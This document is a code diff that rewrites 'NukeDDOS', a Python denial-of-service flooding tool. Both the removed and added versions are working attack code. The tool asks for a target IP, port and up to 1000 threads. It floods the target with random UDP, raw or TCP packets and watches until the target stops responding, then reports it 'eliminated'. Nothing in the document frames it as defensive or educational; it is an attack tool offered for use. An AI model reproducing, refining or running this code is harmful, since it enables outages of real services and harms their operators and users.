@@ -6,20 +6,9 @@ import random
 import threading
 import struct
 import subprocess
-from functools import partial
 from itertools import cycle
 
-# ======== OPTIMIZED CONFIGURATION ========
-os.system("printf '\033c' && figlet -f slant NukeDDOS")  # Faster clear
-print("Author   : Laila19\ngithub   : https://github.com/lailacypher\n")
-
-# Input with validation
-target_ip = input("Target IP : ").strip()
-target_port = int(input("Port      : ").strip())
-thread_count = min(int(input("Threads   : ").strip()), 1000)  # Built-in limit
-
-# ======== MEMORY OPTIMIZATIONS ========
-# Immutable tuple for packet types (cache-friendly)
+# ===== CONSTANTS =====
 PACKET_TYPES = (
     ("UDP", socket.SOCK_DGRAM),
     ("RAW", socket.SOCK_RAW),
@@ -27,151 +16,142 @@ PACKET_TYPES = (
     ("TCP", socket.SOCK_STREAM)
 )
 
-# String pre-allocation
-STRINGS = {
-    'progress': "[%-30s] %d%%",
-    'attack': "\rAttack Progress: |%-30s| %.1f%%",
-    'target_down': "\n\nTarget is down! Stopping attack..."
-}
-
-# ======== OPTIMIZED CORE FUNCTIONS ========
-def check_target(ip, port, attempts=3, timeout=1):
-    """Ultra-optimized target status checker"""
-    for _ in range(attempts):
-        try:
-            # Reusable socket context
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(timeout)
-                if s.connect_ex((ip, port)) == 0:
-                    return True
-            
-            # System-level ping call
-            return subprocess.run(
-                ['ping', '-c', '1', '-W', str(timeout), ip],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            ).returncode == 0
-        except:
-            continue
-    return False
-
-# Pre-computed IP generator
-_random_ip = partial(socket.inet_ntoa, struct.pack('>I', random.randint(1, 0xffffffff)))
-
-# ======== OPTIMIZED VISUALS ========
-def show_progress(duration=3, message="", steps=30):
-    """Zero-overhead progress bar"""
-    print(f"\n{message}...")
-    template = STRINGS['progress']
-    for i in range(steps + 1):
-        print(template % ('█'*i + '-'*(steps-i), (i*100)//steps), end='\r', flush=True)
-        time.sleep(duration/steps)
-    print()
-
-# ======== OPTIMIZED ATTACK CORE ========
-class AttackEngine:
-    __slots__ = ['sent', 'running', 'target_up', 'completion', 'lock']  # Memory optimization
-    
+# ===== VISUALIZATION =====
+class AttackVisualizer:
     def __init__(self):
-        self.sent = 0
-        self.running = True
-        self.target_up = True
-        self.completion = 0
+        self.spinner = cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
+        self.last_update = 0
+        self.packet_count = 0
+        self.speed = 0
         self.lock = threading.Lock()
     
-    def attack(self, ip, port, packet_name, sock_type):
-        """Optimized attack vector"""
-        data = random._urandom(2048)
-        target = (ip, port)
-        proto = socket.IPPROTO_UDP if packet_name == "UDP" else 0
-        
-        while self.running and self.target_up:
-            try:
-                # Single socket per thread with reuse
-                with socket.socket(socket.AF_INET, sock_type, proto) as sock:
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    
-                    # Batch packet sending
-                    packets = [
-                        data[:512], data[512:1024],
-                        data[1024:1536], data[1536:]
-                    ]
-                    
-                    for _ in range(5):  # Batch send
-                        for packet in packets:
-                            try:
-                                sock.sendto(packet + _random_ip().encode(), target)
-                                with self.lock:
-                                    self.sent += 1
-                            except socket.error:
-                                continue
-            except Exception:
-                continue
-
-    def monitor(self, ip, port):
-        """Intelligent target monitoring"""
-        baseline = sum(check_target(ip, port, 1, 0.5) for _ in range(5)) / 5
-        while self.running:
-            current = sum(check_target(ip, port, 1, 0.5) for _ in range(5)) / 5
-            self.completion = min(100, max(0, (1 - current/max(baseline, 0.01)) * 100))
+    def update_display(self, completion, target_status):
+        now = time.time()
+        with self.lock:
+            # Calculate packets per second
+            if self.last_update > 0:
+                self.speed = self.packet_count / (now - self.last_update)
+            self.last_update = now
+            self.packet_count = 0
             
-            print(STRINGS['attack'] % (
-                '█' * int(self.completion/3.33) + '-' * (30 - int(self.completion/3.33)),
-                self.completion
-            ), end='', flush=True)
+            # Progress bar with color coding
+            bar_length = 40
+            filled = int(bar_length * completion / 100)
+            progress_bar = (f"\033[92m█\033[0m" * filled +  # Green for progress
+                          f"\033[91m-\033[0m" * (bar_length - filled))  # Red for remaining
             
-            if current < 0.2:
-                print(STRINGS['target_down'])
-                self.target_up = False
-                self.running = False
-                self.completion = 100
-                break
-            time.sleep(5)
-
-# ======== MAIN EXECUTION ========
-if __name__ == "__main__":
-    # Initial target verification
-    if not check_target(target_ip, target_port):
-        print(f"\nError: Target {target_ip}:{target_port} is not responding.")
-        exit()
-
-    # Packet selection
-    print("\nSelect packet type:")
-    for i, (name, _) in enumerate(PACKET_TYPES, 1):
-        print(f"{i}. {name}")
+            # Status display
+            status = (f"\r\033[K{next(self.spinner)} Attacking {target_ip}:{target_port} | "
+                     f"Packets: {self.packet_count:,} | "
+                     f"Speed: {self.speed:,.0f} pkt/s | "
+                     f"Progress: {progress_bar} {completion:.1f}% | "
+                     f"Status: {'\033[91mDOWN\033[0m' if not target_status else '\033[92mUP\033[0m'}")
+            print(status, end='', flush=True)
     
-    type_choice = int(input("Packet Type (1-4): ").strip()) - 1
-    packet_name, sock_type = PACKET_TYPES[type_choice]
+    def increment_counter(self):
+        with self.lock:
+            self.packet_count += 1
 
-    # Startup sequence
-    for msg in ["Initializing weapons", "Building payload", "Spawning threads"]:
-        show_progress(1.5, msg)
-    show_progress(1, "Launching attack")
-
-    # Attack core
-    engine = AttackEngine()
+# ===== CORE ATTACK =====
+def launch_attack(ip, port, packet_type, visualizer):
+    sock_type = PACKET_TYPES[packet_type][1]
+    proto = socket.IPPROTO_UDP if packet_type == 0 else 0
     
-    # Attack threads
-    threads = [
-        threading.Thread(target=engine.attack, args=(target_ip, target_port, packet_name, sock_type)),
-        threading.Thread(target=engine.monitor, args=(target_ip, target_port))
-    ]
-    
-    for t in threads:
-        t.daemon = True
-        t.start()
-
-    # Main control
     try:
-        while engine.running:
+        with socket.socket(socket.AF_INET, sock_type, proto) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            data = random._urandom(1024)
+            
+            while attack_active.is_set():
+                try:
+                    s.sendto(data + struct.pack('>I', random.randint(1, 0xffffffff)), (ip, port))
+                    visualizer.increment_counter()
+                except socket.error:
+                    continue
+    except Exception as e:
+        print(f"\nAttack error: {str(e)}")
+
+# ===== TARGET MONITOR =====
+def monitor_target(ip, port, visualizer):
+    baseline = check_target_health(ip, port)
+    max_packets = 100000  # Simulation target for 100%
+    
+    while attack_active.is_set():
+        current_health = check_target_health(ip, port)
+        completion = min(100, (1 - (current_health / baseline)) * 100) if baseline > 0 else 100
+        
+        visualizer.update_display(completion, current_health > 0.2)
+        
+        if current_health < 0.1:  # Target is down
+            print("\n\033[91mTARGET ELIMINATED!\033[0m")
+            break
+        time.sleep(0.5)
+
+def check_target_health(ip, port, samples=5):
+    successful_checks = 0
+    for _ in range(samples):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.5)
+                if s.connect_ex((ip, port)) == 0:
+                    successful_checks += 1
+        except:
+            continue
+    return successful_checks / samples
+
+# ===== MAIN =====
+if __name__ == "__main__":
+    os.system("clear && figlet -f slant NukeDDOS")
+    print("Author: Laila19 | github.com/lailacypher\n")
+    
+    # Get target info
+    target_ip = input("Target IP: ").strip()
+    target_port = int(input("Target Port: ").strip())
+    threads = min(int(input("Threads (1-1000): ").strip()), 1000)
+    
+    # Verify target
+    if not check_target_health(target_ip, target_port):
+        print("\033[91mTarget not responding! Verify IP/Port\033[0m")
+        exit()
+    
+    # Packet type selection
+    print("\nSelect attack method:")
+    for i, (name, _) in enumerate(PACKET_TYPES):
+        print(f"{i+1}. {name}")
+    packet_type = int(input("Choice (1-4): ")) - 1
+    
+    # Initialize components
+    attack_active = threading.Event()
+    attack_active.set()
+    visualizer = AttackVisualizer()
+    
+    # Start attack threads
+    print("\n\033[93mInitializing attack...\033[0m")
+    time.sleep(1)
+    
+    for _ in range(threads):
+        threading.Thread(
+            target=launch_attack,
+            args=(target_ip, target_port, packet_type, visualizer),
+            daemon=True
+        ).start()
+    
+    # Start monitoring
+    threading.Thread(
+        target=monitor_target,
+        args=(target_ip, target_port, visualizer),
+        daemon=True
+    ).start()
+    
+    # Main control loop
+    try:
+        while attack_active.is_set():
             time.sleep(0.1)
     except KeyboardInterrupt:
-        print("\n\nStopping attack by user request...")
-        engine.running = False
-
-    # Cleanup
-    for t in threads:
-        t.join(1)
-
-    print(f"\nAttack finished. Total packets sent: {engine.sent}")
-    print(f"Final status: {'Target DOWN' if engine.completion >= 95 else 'Target still up'}")
+        print("\n\033[93mStopping attack...\033[0m")
+        attack_active.clear()
+        time.sleep(1)  # Allow threads to exit
+    
+    print("\nAttack terminated. Final stats:")
+    visualizer.update_display(100, False)
+    print()
